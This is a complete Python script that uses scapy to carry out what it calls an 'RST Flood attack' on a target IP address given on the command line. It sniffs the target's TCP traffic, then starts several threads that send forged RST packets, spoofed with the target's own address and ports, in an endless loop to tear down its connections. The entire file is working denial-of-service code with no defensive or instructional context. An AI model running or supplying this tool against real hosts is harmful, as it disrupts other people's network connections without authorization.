import argparse
import time

import threading
from scapy.all import *

def parseArgs():
	parser = argparse.ArgumentParser(description="Execute RST Flood attack on target IP address")
	parser.add_argument("target_ip", type=str, help="Target IP address to flood communcations with RST packets")

	return parser.parse_args()


def spoof(src_ip, dst_ip, src_port, dst_port):
	print("SPOOFING %s:%s ~ %s %s" % (src_ip, src_port, dst_ip, dst_port) )
	IP_Header = IP(src=src_ip, dst=dst_ip)
	TCP_Header = TCP(sport=src_port, dport=dst_port, flags="R")
	payload = "This is a payload and it doesn't really matter what it is."

	spoofed_packet = IP_Header / TCP_Header / payload
	while True:
		send(spoofed_packet, verbose=False)
		time.sleep(0.25)



MAX_THREADS = 5
MAX_SPOOFS = 3

if __name__ == '__main__':
	args = parseArgs()

	dst_spoofs = {}

	active_threads = 0
	while active_threads < MAX_THREADS:
		packet = sniff(filter="tcp and src %s" % args.target_ip, count=1)
		ip = packet[0][1]
		tcp = packet[0][1][1]

		if ip.dst not in dst_spoofs and len(dst_spoofs) < MAX_SPOOFS:
			dst_spoofs[ip.dst] = []

		if ip.dst in dst_spoofs and (tcp.sport, tcp.dport) not in dst_spoofs[ip.dst]:
			spoof_thread = threading.Thread(target=spoof, args=(ip.src, ip.dst, tcp.sport, tcp.dport) )
			spoof_thread.start()

			dst_spoofs[ip.dst].append((tcp.sport, tcp.dport))
			active_threads += 1

		
